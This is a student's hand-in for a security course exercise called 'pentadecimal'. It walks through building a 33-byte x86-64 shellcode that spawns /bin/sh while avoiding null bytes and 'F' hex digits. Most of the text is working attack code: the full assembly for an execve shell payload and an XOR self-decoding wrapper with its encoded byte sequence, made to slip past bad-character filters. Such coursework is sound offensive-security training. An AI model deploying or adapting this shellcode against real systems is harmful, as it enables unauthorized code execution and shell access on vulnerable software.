# PCS final -- `pentadecimal`

### Anders Holst (`sortraev`, `wlc376`)

#### Status of hand-in

I successfully construct a `sh`-popping piece of shellcode of containing 33
bytes with no NULL bytes or `F` digits.

## Restrictions imposed upon the shellcode

The shellcode cannot contain null bytes or `F` digits, and must be 50 bytes or
less. As usual, absence of null bytes makes it hard to encode forward
jumps/calls, but the absence of `F` digits can also make it hard to encode
*backward* jumps. This can eg. make it hard to obtain `rip` control using a
trampoline, but as we saw earlier in the course, we can use the `lea [rel
<symbol>]` instruction to obtain `rip` control as:

```
lea rax, [rel .some_label - foo]
add rax, foo
; rax now holds address of .some_label
.some_label:
```

as long as we choose an appropriate value for the immediate value `foo`.
However, this costs a great number of bytes, which we can save by making a small
assumption: in the disassembly of `main`, I notice that the shellcode is called
using a `call rax`, meaning `rax` holds the address of the start of the
shellcode upon entry. Easy!

Aside from this, the absence of null bytes and `F` digits also poses
restrictions on the instructions we can use, and, in particular, immediate
values. Some of these restrictions we could probably get around by substituting
other instructions, while for others some we cannot. For example, `syscall`
contains an `F`, and we definitely need a `syscall` in our shellcode. In
addition, the string `"/bin/sh"` contains backslashes which has the hex value
`0x2f`, and we will probably also need to pass this string to `execve`.

This means I will probably have to encode my shellcode and wrap the encoded
shellcode in *additional* shellcode to decode the sh-popping shellcode on the
fly. Did somebody say shellcode? This should be doable, but the decoding code
must, of course, also adhere to the restrictions!


## Developing the shellcode

#### Original shellcode

Below snippet shows the shellcode that I ideally would like to run. It is 22
bytes long and contains no NULL bytes, however it contains a couple of `F`
digits.

```asm
bits 64
  xor esi, esi   ; rsi = NULL.
  push rsi       ; null-terminate string on stack.

  mov rax, 0x68732f2f6e69622f ; push "/bin//sh".
  push rax

  push rsp    
  pop rdi        ; rdi = "/bin//sh\0".

  push byte 59   ; syscall execve.
  pop rax

  cdq            ; rdx = NULL.
  syscall
```

As mentioned earlier, the idea is to wrap the shellcode in encoding code, and
then to find an encoding key which suits the entire code.

#### Final shellcode

Below snippet shows my final shellcode, where I have inserted a small decoding
loop to the head of the shellcode, which XOR's each byte in the shellcode with a
given decoding key. Since the second byte of `jne .decode_loop` contains an
`F`, the decoding actually starts one byte before the sh-popping shellcode. To
terminate the decoding loop, I insert an extra byte equal to the decoding key at
the end of the sh-popping code, since `key ^ key = 0` and hence the `jne` loop
terminates.

The final shellcode is 33 bytes long and looks like this:

```x86asm
%define key 0x22 ; encoding/decoding key.

bits 64
  ; if we do not assume rax holds address of the shellcode upon entry, we
  ; can use an extra 13 bytes to obtain rip as such:
  ; lea rax, [rel .decode_loop - 0x22222222]
  ; add rax, 0x22222222

.decode_loop:
  lea rax, [rax + 1]        ; rax holds address of shellcode upon entry.
  xor [rax + 0x8], byte key ; decode!
  db 0x75, (0xf6 ^ key)     ; becomes `jne .decode_loop` after first xor.

  ; below sequence becomes sh-popping shellcode after above loop terminates.
  db 0x31 ^ key, 0xF6 ^ key, 0x56 ^ key, 0x48 ^ key, 0xB8 ^ key, 0x2F ^ key, \
     0x62 ^ key, 0x69 ^ key, 0x6E ^ key, 0x2F ^ key, 0x2F ^ key, 0x73 ^ key, \
     0x68 ^ key, 0x50 ^ key, 0x54 ^ key, 0x5F ^ key, 0x6A ^ key, 0x3B ^ key, \
     0x58 ^ key, 0x99 ^ key, 0x0F ^ key, 0x05 ^ key

  ; this last key byte is here to terminate the .foo loop, since key ^ key = 0.
  db key
```

*Note in the commented-out code how we can alleviate the assumption of `rax`
holding the address of our shellcode -- this cost me 13 extra bytes, so I
decided to go with the assumption.*

The encoding/decoding key we choose must satisfy:

1) the decoding key must not be 0 and must not contain `F` digits;
2) the decoding key must not be present in the shellcode before encoding, aside
   from the loop-terminating byte.

I write an automated script to find me all possible such keys for the given
shellcode, and choose `0x22` simply because it is the prettiest, but others work
aswell.
